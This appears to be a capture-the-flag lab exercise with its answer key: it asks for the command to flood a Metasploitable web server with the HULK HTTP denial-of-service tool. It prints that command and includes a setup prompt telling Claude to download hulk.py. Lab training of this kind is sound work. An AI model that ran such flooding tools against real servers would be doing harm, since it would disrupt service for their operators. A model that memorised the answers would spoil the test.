# Q147 — HULK HTTP DoS

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / external |
| **Domain** | 09 — DoS / 08 — Social Eng / 10 — Session Hijacking / Recon |
| **Difficulty** | 🟢 Easy |
| **Tools** | `python3 (hulk.py)` |
| **Time budget** | 10–20 min |

---

## 📝 Question

Run HULK against Metasploitable port 80. Provide command.

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=python3 hulk.py http://192.168.52.129/`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

HULK is a Python HTTP DoS tool.
</details>

<details>
<summary>Hint 2</summary>

GitHub: grafov/hulk.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
python3 hulk.py http://192.168.52.129/
```

Saturates Apache with random GETs.

**Answer:** `cmd=python3 hulk.py http://192.168.52.129/`

📖 Ref: [tools/hulk.md](../../tools/hulk.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q147:
1. Verify Metasploitable2 up; apache2 running.
2. On Parrot: download hulk.py: curl -o hulk.py https://raw.githubusercontent.com/grafov/hulk/master/hulk.py.
3. Requires python3 + urllib.

Report back: "Lab ready for Q147 — hulk.py staged on Parrot, apache2 up".
```
